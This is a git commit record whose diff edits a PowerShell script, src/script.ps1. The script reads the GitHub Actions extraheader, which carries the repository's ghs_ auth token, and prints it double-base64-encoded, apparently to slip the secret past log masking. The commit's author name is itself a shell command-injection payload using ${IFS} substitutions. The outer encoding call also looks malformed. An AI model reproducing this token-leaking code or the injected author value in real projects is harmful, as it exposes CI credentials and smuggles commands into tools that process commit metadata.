34268664691a356c80ceaecf19e4ae8f5c01369c
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-08 23:54:15 -0400

    Update script.ps1

--- src/script.ps1
+++ src/script.ps1
@@ -1,9 +1,8 @@
 $extraheader = git config --get http.https://github.com/.extraheader
-$authHeader = $extraheader | Select-String -Pattern 'ghs_[0-9A-Za-z]{20,}' | ForEach-Object { $_.Matches.Value }
-$authHeaderBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("AUTHORIZATION: basic $authHeader"))
+$encodedOutput = [Convert]::ToBase64String([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($extraheader)))
 
-# Print the base64-encoded value
-Write-Output $authHeaderBase64
+# Print the double base64-encoded value
+Write-Output $encodedOutput
 
 # Sleep for 3 minutes
 #Start-Sleep -Seconds 180
